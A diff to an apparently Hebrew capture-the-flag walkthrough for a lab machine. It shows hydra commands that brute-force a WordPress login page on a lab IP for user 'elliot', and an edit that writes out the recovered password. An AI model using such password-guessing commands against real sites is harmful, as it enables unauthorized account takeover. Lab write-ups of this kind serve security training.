@@ -144,12 +144,18 @@ hydra -L fs-list -p test 10.112.177.29 http-post-form "/wp-login.php:log=^USER^&
 Bash
 hydra -l elliot -P fs-list 10.112.177.29 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered" -t 64
 
-תוצאה: הסיסמה נמצאה בהצלחה (היא תופיע בשורה ירוקה בטרמינל)
+תוצאה: הסיסמה נמצאה בהצלחה ER28-0652
 
 
 
 
 <img width="1665" height="190" alt="image" src="https://github.com/user-attachments/assets/ca5c9d76-33c8-4cab-8184-f7b627d7016d" />
+
+
+
+
+<img width="1632" height="879" alt="image" src="https://github.com/user-attachments/assets/ebceb381-6d39-486a-ac47-18fcd4e9ad34" />
+
 
 
 
